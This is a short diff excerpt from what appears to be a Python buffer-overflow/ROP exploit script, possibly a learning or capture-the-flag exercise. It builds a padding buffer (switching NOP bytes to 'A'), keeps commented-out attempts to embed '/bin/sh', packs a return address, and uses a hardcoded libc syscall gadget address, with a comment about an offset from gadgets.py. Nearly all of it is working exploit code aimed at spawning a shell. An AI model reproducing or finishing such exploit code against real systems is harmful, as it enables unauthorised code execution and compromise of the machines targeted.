@@ -19,7 +19,7 @@ g4 = 0x7ffff7b9476b #syscall
 # removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
 shellcode =''
 for i in range(1,37) :
-    shellcode += '\x90'
+    shellcode += 'A'
 # shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
 # shellcode += struct.pack('<p',"'/bin/sh',0")
 shellcode += struct.pack('<q', retStringRev)
